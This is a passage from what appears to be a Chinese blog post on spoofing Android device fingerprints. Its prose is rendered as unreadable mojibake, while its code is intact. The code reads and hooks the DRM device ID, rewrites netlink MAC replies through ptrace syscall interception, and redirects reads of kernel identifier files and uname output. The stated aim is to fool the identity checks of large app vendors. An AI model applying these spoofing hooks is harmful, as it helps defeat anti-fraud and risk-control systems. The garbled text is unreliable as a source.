title="Get:"></a>Get:</h5><p>ä½¿ç”¨çš„è¯å¾ˆç®€å•ï¼Œç›´æ¥å¯¼å…¥å¤´æ–‡ä»¶å°±å¥½ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/system_properties.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> sdk[PROP_VALUE_MAX] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">__system_property_get(<span class="string">&quot;ro.build.version.sdk&quot;</span>, sdk);</span><br></pre></td></tr></table></figure><h4 id="Nativeè·å–DRM-IDï¼ˆé‡è¦ï¼‰"><a href="#Nativeè·å–DRM-IDï¼ˆé‡è¦ï¼‰" class="headerlink" title="Nativeè·å–DRM IDï¼ˆé‡è¦ï¼‰"></a>Nativeè·å–DRM IDï¼ˆé‡è¦ï¼‰</h4><p>è¿™ä¸ªæŒ‡çº¹ä¹Ÿæ˜¯å¾ˆå¤šå¤§å‚ç”¨ä½œå”¯ä¸€IDçš„æ ¸å¿ƒæŒ‡çº¹ã€‚å¤„ç†çš„è¯ä¹Ÿéœ€è¦æ³¨æ„ï¼Œ<strong>å¾ˆæ ¸å¿ƒçš„ä¸€ä¸ªè®¾å¤‡æŒ‡çº¹IDã€‚</strong></p><h5 id="Get-8"><a href="#Get-8" class="headerlink" title="Get:"></a>Get:</h5><p>ä½¿ç”¨çš„è¯å¾ˆç®€å•ï¼Œç›´æ¥å¯¼å…¥å¤´æ–‡ä»¶å°±å¥½ã€‚ä»£ç ä¸è¶…è¿‡10è¡Œ ã€‚</p><p>å¯¼å…¥çš„å¤´æ–‡ä»¶å®ç°è¿™ä¸ªSoåœ¨mediandk.soé‡Œé¢ ï¼Œæ‰€ä»¥<code>cmake-&gt;target_link_libraries</code>å¼•å…¥çš„æ—¶å€™åˆ«å¿˜è®°æ·»åŠ mediandk å¼•å…¥ä¾èµ–ã€‚</p><p><strong>è¿™ä¸ªå€¼ä¸åŒApp è¯»å–çš„å†…å®¹éƒ½ä¸ä¸€æ ·ï¼Œè¿™å—éœ€è¦æ³¨æ„ã€‚</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;media/NdkMediaDrm.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="type">const</span> <span class="type">uint8_t</span> uuid[] = &#123;<span class="number">0xed</span>,<span class="number">0xef</span>,<span class="number">0x8b</span>,<span class="number">0xa9</span>,<span class="number">0x79</span>,<span class="number">0xd6</span>,<span class="number">0x4a</span>,<span class="number">0xce</span>,</span><br><span class="line">                            <span class="number">0xa3</span>,<span class="number">0xc8</span>,<span class="number">0x27</span>,<span class="number">0xdc</span>,<span class="number">0xd5</span>,<span class="number">0x1d</span>,<span class="number">0x21</span>,<span class="number">0xed</span></span><br><span class="line">&#125;;</span><br><span class="line">AMediaDrm *mediaDrm = <span class="built_in">AMediaDrm_createByUUID</span>(uuid);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// è·å– deviceUniqueId</span></span><br><span class="line">AMediaDrmByteArray aMediaDrmByteArray;</span><br><span class="line"><span class="built_in">AMediaDrm_getPropertyByteArray</span>(mediaDrm,PROPERTY_DEVICE_UNIQUE_ID, &amp;aMediaDrmByteArray);</span><br><span class="line">string resut = Base64Utils::<span class="built_in">Encode</span>((<span class="type">uint8_t</span> *)aMediaDrmByteArray.ptr,aMediaDrmByteArray.length);</span><br></pre></td></tr></table></figure><h5 id="Mock-6"><a href="#Mock-6" class="headerlink" title="Mock:"></a>Mock:</h5><p>Hookçš„è¯ä¹Ÿå¾ˆç®€å•ï¼Œç›´æ¥Hookè¿™ä¸ªå‡½æ•°åœ°å€å°±è¡Œï¼Œä½†æ˜¯è¿™ä¸ªæ–¹æ³•ä¹Ÿæ˜¯ä¸€ä¸ªçŸ­æŒ‡ä»¤ï¼Œéœ€è¦ç”¨åˆ°å¼‚å¸¸Hookã€‚</p><p>å¤„ç†é€»è¾‘å¦‚ä¸‹ï¼Œå› ä¸ºæˆ‘ä»¬åªéœ€è¦å…³æ³¨description å³å¯ã€‚å…¶ä»–å†…å®¹ä¸å¤„ç†ã€‚è¿™å—æœ‰æ—¶å€™ç›´æ¥å†™å…¥å¯èƒ½ä¼šå¯¼è‡´é—®é¢˜ï¼Œéœ€è¦å…ˆmprotectï¼Œä¸èƒ½ç›´æ¥ç”¨mprotectéœ€è¦è®¡ç®—ä¸€ä¸‹æ‰‡å¶å¤§å°ï¼Œæ˜¯å¦å†…å­˜å¯¹é½ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">MPROTECT</span><span class="params">(<span class="type">size_t</span> addr,<span class="type">size_t</span> size,<span class="type">int</span> __prot)</span></span>&#123;</span><br><span class="line">    <span class="comment">// è®¡ç®—é¡µé¢å¯¹é½</span></span><br><span class="line">    <span class="keyword">auto</span> alignment = (<span class="type">unsigned</span>) ((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) addr % <span class="built_in">sysconf</span>(_SC_PAGESIZE));</span><br><span class="line">    <span class="comment">// ä¿è¯å¼€å§‹åœ°å€å‡å»æ‰‡å¶å¤§å°</span></span><br><span class="line">    <span class="type">int</span> i = <span class="built_in">mprotect</span>((<span class="type">void</span> *) (addr - alignment), (<span class="type">size_t</span>) (alignment + size),__prot);</span><br><span class="line">    <span class="keyword">return</span> i == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">HOOK_DEF_DRM</span>(<span class="type">media_status_t</span>, AMediaDrm_getPropertyByteArray,</span><br><span class="line">             AMediaDrm * drm, <span class="type">const</span> <span class="type">char</span> *propertyName, AMediaDrmByteArray *propertyValue)&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 1. è°ƒç”¨åŸå‡½æ•°è·å–çœŸå®å€¼</span></span><br><span class="line">    <span class="type">media_status_t</span> array = <span class="built_in">orig_AMediaDrm_getPropertyByteArray</span>(drm, propertyName, propertyValue);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2. æ£€æŸ¥æ˜¯å¦ä¸ºç›®æ ‡å±æ€§</span></span><br><span class="line">    <span class="keyword">if</span>(propertyName != <span class="literal">nullptr</span> &amp;&amp; </span><br><span class="line">       <span class="built_in">strstr</span>(propertyName, PROPERTY_DEVICE_UNIQUE_ID) != <span class="literal">nullptr</span> &amp;&amp;</span><br><span class="line">       propertyValue != <span class="literal">nullptr</span> &amp;&amp; </span><br><span class="line">       propertyValue-&gt;ptr != <span class="literal">nullptr</span> &amp;&amp; </span><br><span class="line">       propertyValue-&gt;length != <span class="number">0</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 3. æ£€æŸ¥Mockæ•°æ®æ˜¯å¦å‡†å¤‡å¥½</span></span><br><span class="line">        <span class="keyword">if</span>(gMockdrmid == <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> array; <span class="comment">// è¿”å›åŸå€¼</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 4. ä¿®æ”¹å†…å­˜ä¿æŠ¤å±æ€§</span></span><br><span class="line">        <span class="built_in">MPROTECT</span>((<span class="type">size_t</span>)propertyValue-&gt;ptr, propertyValue-&gt;length, MEMORY_RWX);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 5. æ›¿æ¢æ•°æ®</span></span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="type">void</span>*)propertyValue-&gt;ptr, gMockdrmid, <span class="built_in">strlen</span>(gMockdrmid));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Netlinkerè·å–ç½‘å¡ä¿¡æ¯"><a href="#Netlinkerè·å–ç½‘å¡ä¿¡æ¯" class="headerlink" title="Netlinkerè·å–ç½‘å¡ä¿¡æ¯"></a>Netlinkerè·å–ç½‘å¡ä¿¡æ¯</h4><p>Linuxåº•å±‚ä¸ç®¡ä»€ä¹ˆæ ·çš„è·å–ç½‘å¡ï¼Œæœ€ç»ˆåº•å±‚ç›´æ¥ä¼šèµ°<code>Netlinker</code>å»è·å–ç½‘å¡ã€‚åœ¨<strong>android 10ä»¥ä¸‹</strong>å¯ä»¥ç»•è¿‡ç³»ç»Ÿæƒé™ä»è€Œè·å–ç½‘å¡ä¿¡æ¯ï¼Œé«˜ç‰ˆæœ¬å·²ç»å¤±æ•ˆäº†ã€‚</p><p>åº•å±‚éƒ½æ˜¯<code>svc</code>ç›´æ¥è°ƒç”¨<code>recvfrom</code>æˆ–è€…<code>recvmsg</code>å»æ¥å—<code>socket</code>çš„æ¶ˆæ¯ ã€‚æ‰€ä»¥ä¸å¤„ç†<code>svc</code>çš„è¯ï¼Œæ— æ³•åšåˆ°å…¨é‡ä¿®æ”¹çš„ã€‚</p><p><strong>æˆ‘ç”¨çš„æ˜¯ptrace åœ¨recvfrom æ‰§è¡Œå®Œæ¯•ä»¥åï¼Œè¯»å–å‚æ•°å¯„å­˜å™¨ï¼Œå°†æ•°æ®ä¿®æ”¹ä»¥ååœ¨é‡æ–°è¦†ç›–å¯„å­˜å™¨å³å¯ã€‚</strong>å¤„ç†è¿‡ç¨‹å¦‚ä¸‹</p><blockquote><p>ç»†èŠ‚ç‚¹ï¼š</p><p>socketä¸»è¦æ¥å—æ¶ˆæ¯çš„å‡½æ•°ä¸»è¦å°±ä¸‰ä¸ªï¼Œ<code>recvfrom,recvmsg,recv</code>  ï¼Œnetlinkeré€šè®¯å°±æ˜¯é€šè¿‡è¿™ä¸‰ä¸ªå‡½æ•°å¤„ç†çš„ï¼Œrecvåº•å±‚è°ƒç”¨çš„æ˜¯recvfrom ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å¤„ç†<strong>recvfromï¼Œå’Œ recvmsg</strong> å³å¯ã€‚</p><p>recvfromæ‰§è¡Œå®Œæ¯•ä»¥åå‚æ•°æ˜¯ä¸ªæ•°ç»„ï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠè¿™ä¸ªæ•°ç»„buffçš„å€¼è¿›è¡Œè¦†ç›–å³å¯ï¼Œä½†æ˜¯recvmsgçš„è¯ä¸èƒ½è¿™ä¹ˆå¤„ç†ï¼Œä»–çš„å‚æ•°æ˜¯iovecæŒ‡é’ˆï¼Œè¿™ä¸ªä¸œè¥¿å¤§å®¶å¯ä»¥ç†è§£æˆä¸€ä¸ªç®±å­ã€‚é‡Œé¢è£…äº†å…·ä½“çš„å†…å®¹ï¼Œé•¿åº¦å’Œå¼€å§‹ä½ç½® ã€‚æ‰€ä»¥ä¿®æ”¹çš„æ—¶å€™éœ€è¦è¯»å–è¿™ä¸ªå¼€å§‹ä½ç½®çš„æŒ‡é’ˆæ‰å¯ä»¥è¿›è¡Œsetã€‚</p></blockquote><p><strong>å¤„ç†svc -&gt; recvmsgï¼š</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">NetlinkMacHandler::netlinkHandler_recmsg</span><span class="params">(Tracer *tracee)</span> &#123;</span><br><span class="line">    <span class="type">ssize_t</span> bytes_read = TEMP_FAILURE_RETRY(peek_reg(tracee, CURRENT, SYSARG_RESULT));</span><br><span class="line">    <span class="keyword">if</span> (bytes_read &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// get org value </span></span><br><span class="line">        <span class="type">word_t</span> msg = peek_reg(tracee, CURRENT, SYSARG_2);</span><br><span class="line">        <span class="keyword">if</span>(msg == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">auto</span> *my_Msg = (msghdr *) alloca(<span class="keyword">sizeof</span>(msghdr));</span><br><span class="line">        <span class="type">int</span> msg_ret = read_data(tracee, (<span class="type">void</span> *) my_Msg, (<span class="type">word_t</span>) msg, <span class="keyword">sizeof</span>(msghdr));</span><br><span class="line">        <span class="keyword">if</span> (msg_ret == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">//LOGE(&quot;ptrace SC_recvmsg msg_ret read sucess ! &quot;)</span></span><br><span class="line">            <span class="keyword">auto</span> *iov = (iovec *) alloca(<span class="keyword">sizeof</span>(iovec));</span><br><span class="line">            <span class="type">int</span> iov_ret = read_data(tracee, (<span class="type">void</span> *) iov, (<span class="type">word_t</span>) my_Msg-&gt;msg_iov, <span class="keyword">sizeof</span>(iovec));</span><br><span class="line">            <span class="keyword">if</span> (iov_ret == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">//LOGE(&quot;ptrace SC_recvmsg iov read sucess ! buff size -&gt;%lu  &quot;,iov-&gt;iov_len)</span></span><br><span class="line">                <span class="comment">//ä¿å­˜ä¸€ä»½ä¸´æ—¶çš„temp buff</span></span><br><span class="line">                <span class="keyword">auto</span> *temp_hdr = (nlmsghdr *) alloca(iov-&gt;iov_len);</span><br><span class="line">                <span class="comment">//temp_hdrä½¿æˆ‘ä»¬è‡ªå·±çš„åˆ›å»ºçš„,ä½†æ˜¯åœ¨handler_mac_callback_svc æ–¹æ³•é‡Œé¢å¯èƒ½å­˜åœ¨</span></span><br><span class="line"> </span><br><span class="line">                <span class="type">int</span> hdr_ret = read_data(tracee, (<span class="type">void</span> *) temp_hdr, (<span class="type">word_t</span>) iov-&gt;iov_base,</span><br><span class="line">                                        iov-&gt;iov_len);</span><br><span class="line">                <span class="keyword">if</span> (hdr_ret == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">//LOGE(&quot;ptrace SC_recvmsg hdr read sucess ! &quot;)</span></span><br><span class="line">                    NetlinkMacHandler::handler_mac_callback_svc(tracee,temp_hdr, bytes_read);</span><br><span class="line">                    <span class="comment">//LOGE(&quot;handler_mac_callback_svc sucess ! &quot;)</span></span><br><span class="line">                    <span class="comment">//è¦†ç›–å’Œé‡å†™</span></span><br><span class="line">                    write_data(tracee, (<span class="type">word_t</span>) iov-&gt;iov_base, temp_hdr, iov-&gt;iov_len);</span><br><span class="line">                    <span class="comment">//LOGE(&quot;ptrace SC_recvmsg write_data sucess ! &quot;)</span></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">//LOGE(&quot;ptrace SC_recvmsg hdr read  fail ! &quot;)</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//LOGE(&quot;ptrace SC_recvmsg iov read  fail ! &quot;)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//LOGE(&quot;ptrace SC_recvmsg msg_ret read fail ! &quot;)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å¤„ç†svc-&gt;recvfrom:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">void NetlinkMacHandler::netlinkHandler_recv(Tracer *tracee) &#123;</span><br><span class="line">    ssize_t bytes_read = TEMP_FAILURE_RETRY(peek_reg(tracee, CURRENT, SYSARG_RESULT));</span><br><span class="line">    if (bytes_read &gt; 0) &#123;</span><br><span class="line">        //get org value </span><br><span class="line">        word_t buff = peek_reg(tracee, CURRENT, SYSARG_2);</span><br><span class="line">        if(buff == 0)&#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        //buffé•¿åº¦</span><br><span class="line">        auto size = (size_t) peek_reg(tracee, CURRENT, SYSARG_3);</span><br><span class="line">        if(size == 0)&#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        char tempBuff[size];</span><br><span class="line">        int readStr_ret = read_data(tracee, tempBuff, buff, size);</span><br><span class="line">        if (readStr_ret != 0) &#123;</span><br><span class="line">            LOGE(&quot;svc netlink handler read_string error  %s&quot;, strerror(errno))</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        auto *hdr = reinterpret_cast&lt;nlmsghdr *&gt;(tempBuff);</span><br><span class="line">        //netlinkæ•°æ®åŒ…ç»“æ„ä½“</span><br><span class="line">        NetlinkMacHandler::handler_mac_callback_svc(tracee,hdr, bytes_read);</span><br><span class="line">        //å°†æ•°æ®å†™å…¥è¦†ç›–æ‰åŸæ¥çš„æ•°æ®</span><br><span class="line">        write_data(tracee, buff, tempBuff, size);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://bbs.pediy.com/thread-271698.htm">Android netlink&amp;svc è·å– Macæ–¹æ³•æ·±å…¥åˆ†æ</a></p><p><a href="https://bbs.pediy.com/thread-273160.htm">SVCçš„TraceHookæ²™ç®±çš„å®ç°&amp;æ— ç—•Hookå®ç°æ€è·¯</a></p><h4 id="å†…æ ¸æ–‡ä»¶ç›¸å…³ï¼ˆé‡è¦ï¼‰"><a href="#å†…æ ¸æ–‡ä»¶ç›¸å…³ï¼ˆé‡è¦ï¼‰" class="headerlink" title="å†…æ ¸æ–‡ä»¶ç›¸å…³ï¼ˆé‡è¦ï¼‰"></a>å†…æ ¸æ–‡ä»¶ç›¸å…³ï¼ˆé‡è¦ï¼‰</h4><p>å†…æ ¸æ–‡ä»¶æŒ‡çš„æ˜¯ç³»ç»Ÿçš„ç›¸å…³æ–‡ä»¶ï¼Œå¾ˆå¤šå¤§å‚ä¼šç›´æ¥é€šè¿‡<code>popen cat</code>æˆ–è€…ç›´æ¥<code>fopen</code>åªè¯»çš„æ–¹å¼å»è¯»å–æ–‡ä»¶å†…å®¹ã€‚æ ¸å¿ƒçš„ä¹Ÿå°±é‚£å‡ ä¸ªã€‚</p><p><strong>ä¸€èˆ¬è¯»å–çš„æ—¶å€™éƒ½æ˜¯ç›´æ¥svc openat åº•å±‚éœ€è¦ç”¨åˆ°svcçš„IOé‡å®šå‘ï¼Œå¦‚æœè¿™å—ä¸å¤„ç†çš„è¯ï¼ŒåŸºæœ¬æ²¡åŠæ³•è¿›è¡Œmockå’Œä¿®æ”¹ ã€‚</strong></p><h4 id="build-propç›¸å…³"><a href="#build-propç›¸å…³" class="headerlink" title="build.propç›¸å…³"></a>build.propç›¸å…³</h4><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;/system/build.prop&quot;</span><br><span class="line">&quot;/odm/etc/build.prop&quot;</span><br><span class="line">&quot;/product/build.prop&quot;</span><br><span class="line">&quot;/vendor/build.prop&quot;</span><br></pre></td></tr></table></figure></blockquote><p>ä¸»è¦å°±æ˜¯è¿™å››ä¸ªæ–‡ä»¶ï¼Œåœ¨ä½ç‰ˆæœ¬è¿™ä¸ªæ–‡ä»¶å¯ä»¥ç›´æ¥å»è¯»ï¼Œæ‰€ä»¥è¿™ä¸ªæ–‡ä»¶ä¹Ÿéœ€è¦åœ¨Mock valueä»¥åç”Ÿæˆä¸€ä»½æ–°çš„ï¼Œä½œä¸ºå¤‡ä»½ã€‚</p><p>ç”Ÿæˆæ–°çš„å€¼è¦å’Œä¹‹å‰Mockçš„å€¼æ˜¯ä¸€æ ·çš„ï¼Œé˜²æ­¢å‡ºç°ä¸ç›¸åŒçš„æƒ…å†µ ã€‚å½“å¯¹æ–¹å¦‚æœä½¿ç”¨äº†SVCè¯»å–è¿™ä¸ªæ–‡ä»¶çš„æ—¶å€™ï¼Œé€šè¿‡SVCçš„IOé‡å®šå‘ç»•è¿‡è¯»å–ã€‚</p><h4 id="proc-sys-kernel-random-boot-id"><a href="#proc-sys-kernel-random-boot-id" class="headerlink" title="&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id"></a>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id</h4><p>è¿™ä¸ªIDé‡å¯æˆ–è€…åˆ·æœºä»¥åå‘ç”Ÿå˜åŒ–ï¼Œå¾ˆå¤šå¤§å‚ä¼šè¯»å–è¿™ä¸ªå€¼ï¼Œè¿™ä¸ªå€¼ç±»ä¼¼ä¸€ä¸ªUUIDï¼ŒSVCè¯»å–è¿™ä¸ªå€¼ï¼Œç„¶åå°†è¿™ä¸ªå€¼ä¿å­˜åˆ°ç§æœ‰ç›®å½•ã€‚</p><p>è·ŸDRM ID ç›¸æ¯”ï¼Œå¥½å¤„å°±æ˜¯ä¸åŒAppè¯»å–çš„å€¼æ˜¯ä¸€æ ·çš„ã€‚ä¸€ä¸ªè®¾å¤‡æŒ‡çº¹å æ¯”å¾ˆé‡çš„å€¼ã€‚</p><h4 id="proc-sys-kernel-random-uuid"><a href="#proc-sys-kernel-random-uuid" class="headerlink" title="&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;uuid"></a>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;uuid</h4><p>åŒä¸Š</p><h4 id="sys-block-mmcblk0-device-cid"><a href="#sys-block-mmcblk0-device-cid" class="headerlink" title="&#x2F;sys&#x2F;block&#x2F;mmcblk0&#x2F;device&#x2F;cid"></a>&#x2F;sys&#x2F;block&#x2F;mmcblk0&#x2F;device&#x2F;cid</h4><p>åŒä¸Š</p><h4 id="sys-devices-soc0-serial-number"><a href="#sys-devices-soc0-serial-number" class="headerlink" title="&#x2F;sys&#x2F;devices&#x2F;soc0&#x2F;serial_number"></a>&#x2F;sys&#x2F;devices&#x2F;soc0&#x2F;serial_number</h4><p>åŒä¸Š</p><h4 id="proc-misc"><a href="#proc-misc" class="headerlink" title="&#x2F;proc&#x2F;misc"></a>&#x2F;proc&#x2F;misc</h4><p>åŒä¸Š</p><h4 id="proc-version"><a href="#proc-version" class="headerlink" title="&#x2F;proc&#x2F;version"></a>&#x2F;proc&#x2F;version</h4><p>è¿™ä¸ªæ˜¯ä¸€ä¸ªlinuxç³»ç»Ÿå†…æ ¸æ–‡ä»¶ï¼Œé‡Œé¢è®°å½•äº†å½“å‰Linuxç³»ç»Ÿç‰ˆæœ¬çš„ç›¸å…³ä¿¡æ¯ã€‚é‡Œé¢çš„å€¼ç±»ä¼¼å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eg. Linux version 3.18.31-perf-g9b0888a(builder@c3-miui-ota-bd96.bj)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ–‡ä»¶åœ¨android 11ä»¥ä¸ŠåŸºæœ¬è¯»ä¸åˆ°äº† ï¼Œä½†æ˜¯åœ¨android 9æ˜¯å¯ä»¥è¯»åˆ°çš„ ã€‚ä½†æ˜¯android 11æœ‰æ²¡æœ‰ä»€ä¹ˆä»£æ›¿æ–¹æ¡ˆå‘¢ï¼Ÿç­”æ¡ˆæ˜¯æœ‰çš„ï¼Œsvc è°ƒç”¨uname ã€‚ ä½¿ç”¨æ–¹å¼ç±»ä¼¼å¦‚ä¸‹ï¼Œunameä¹Ÿæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œï¼Œè¿˜å¯ä»¥é€šè¿‡popen <code>uname -a</code>çš„æ–¹å¼å»è·å– ï¼ˆpopenéƒ¨åˆ†ä¼šä»‹ç»åˆ°ï¼‰ã€‚è¿™ä¸ªå‡½æ•°åœ¨IOSä¸Šé¢ä¹Ÿæ¯”è¾ƒå®ç”¨ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">utsname</span> <span class="title">buff</span>;</span></span><br><span class="line">   <span class="type">int</span> i = uname(&amp;buff);</span><br><span class="line">   LOGE(<span class="string">&quot;uname sysname %s &quot;</span>, buff.sysname)</span><br><span class="line">   LOGE(<span class="string">&quot;uname nodename %s &quot;</span>, buff.nodename)</span><br><span class="line">   LOGE(<span class="string">&quot;uname release %s &quot;</span>, buff.release)</span><br><span class="line">   LOGE(<span class="string">&quot;uname version %s &quot;</span>, buff.version)</span><br><span class="line">   LOGE(<span class="string">&quot;uname machine %s &quot;</span>, buff.machine)</span><br><span class="line">   LOGE(<span class="string">&quot;uname domainname %s &quot;</span>, buff.domainname)</span><br></pre></td></tr></table></figure><p>é€šè¿‡è¿™å‡ é¡¹å°±å¯ä»¥æ‹¿åˆ°&#x2F;proc&#x2F;version é‡Œé¢çš„æ‰€æœ‰ä¿¡æ¯ï¼Œ</p><p><strong>å¾ˆå¤šå¤§å‚ä¼šç”¨&#x2F; popen uname -a &#x2F; svc unameå‡½æ•° &#x2F; å’Œsvc openatå»è¯»&#x2F;proc&#x2F;versionä»¥æ­¤åˆ¤æ–­è·å–çš„å€¼æ˜¯å¦å‡†ç¡®ï¼Œå¦‚æœæœ‰ä¸€ä¸ªå¯¹ä¸ä¸Šéƒ½ä¼šè®¤ä¸ºå½“å‰è®¾å¤‡è¢«ä¿®æ”¹ã€‚</strong></p><p>ä¿®æ”¹æ–¹å¼å¦‚ä¸‹ ï¼Œä¸€èˆ¬åªéœ€è¦å¤„ç†releaseå’ŒVersionå³å¯ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">handlerLinuxEnvInfo</span><span class="params">(Tracer* tracee)</span>&#123;</span><br><span class="line">    <span class="type">word_t</span> reg = peek_reg(tracee, ORIGINAL, SYSARG_1);</span><br><span class="line">    <span class="keyword">if</span>(reg == <span class="number">0</span>)&#123;</span><br><span class="line">        LOGI(<span class="string">&quot;svc after org peek_reg reg 1 == 0 &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">auto</span> *buff = (<span class="keyword">struct</span> utsname *) alloca(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> utsname));</span><br><span class="line">    <span class="type">int</span> msg_ret = read_data(tracee,  buff, reg, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> 